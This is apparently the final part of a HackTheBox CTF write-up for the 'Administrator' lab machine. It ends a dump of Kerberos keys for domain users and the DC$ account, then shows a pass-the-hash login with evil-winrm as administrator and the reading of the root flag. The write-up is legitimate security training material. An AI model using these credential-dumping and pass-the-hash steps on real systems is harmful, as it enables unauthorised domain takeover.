administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
~~~

Notice line **5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)** in result `nmap` scan, so I used tool `evil-winrm` login.

~~~ shell 
┌──(trit㉿chimp)-[~/HackTheBox/Administrator]
└─$ evil-winrm -i 10.10.11.42 -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
04d66e4dff*****9b63600a75f272d11
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
~~~

***Thank you for readling this far! I hope this writeup helps you in your learning and research.***







